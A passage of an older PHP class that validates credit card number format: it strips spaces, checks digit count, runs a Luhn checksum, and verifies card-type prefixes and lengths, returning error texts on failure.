  if (strlen($cardnumber) == 0)  {
     $errornumber = 1;     
     $errortext = $ccErrors [$errornumber];
     return $errortext; 
  }
  
  // Remove any spaces from the credit card number
  $cardNo = str_replace (' ', '', $cardnumber);  
   
  // Check that the number is numeric and of the right sort of length.
  if (!eregi('^[0-9]{13,19}$',$cardNo))  {
     $errornumber = 2;     
     $errortext = $ccErrors [$errornumber];
     return $errortext; 
  }
       
  // Now check the modulus 10 check digit - if required
  if ($cards[$cardType]['checkdigit']) {
    $checksum = 0;                                  // running checksum total
    $mychar = "";                                   // next char to process
    $j = 1;                                         // takes value of 1 or 2
  
    // Process each digit one by one starting at the right
    for ($i = strlen($cardNo) - 1; $i >= 0; $i--) {
    
      // Extract the next digit and multiply by 1 or 2 on alternative digits.      
      $calc = $cardNo{$i} * $j;
    
      // If the result is in two digits add 1 to the checksum total
      if ($calc > 9) {
        $checksum = $checksum + 1;
        $calc = $calc - 10;
      }
    
      // Add the units element to the checksum total
      $checksum = $checksum + $calc;
    
      // Switch the value of j
      if ($j ==1) {$j = 2;} else {$j = 1;};
    } 
  
    // All done - if checksum is divisible by 10, it is a valid modulus 10.
    // If not, report an error.
    if ($checksum % 10 != 0) {
     $errornumber = 3;     
     $errortext = $ccErrors [$errornumber];
     return $errortext; 
    }
  }  

  // The following are the card-specific checks we undertake.

  // Load an array with the valid prefixes for this card
  $prefix = split(',',$cards[$cardType]['prefixes']);
      
  // Now see if any of them match what we have in the card number  
  $PrefixValid = false; 
  for ($i=0; $i<sizeof($prefix); $i++) {
    $exp = '^' . $prefix[$i];
    if (ereg($exp,$cardNo)) {
      $PrefixValid = true;
      break;
    }
  }
      
  // If it isn't a valid prefix there's no point at looking at the length
  if (!$PrefixValid) {
     $errornumber = 3;     
     $errortext = $ccErrors [$errornumber];
     return $errortext; 
  }
    
  // See if the length is valid for this card
  $LengthValid = false;
  $lengths = split(',',$cards[$cardType]['length']);
  for ($j=0; $j<sizeof($lengths); $j++) {
    if (strlen($cardNo) == $lengths[$j]) {
      $LengthValid = true;
      break;
    }
  }
  
  // See if all is OK by seeing if the length was valid. 
  if (!$LengthValid) {
     $errornumber = 4;     
     $errortext = $ccErrors [$errornumber];
     return $errortext; 
  };   
  
  // The credit card is in the required format.
  return 1; //true
}
 
		
} // End of Class
?>
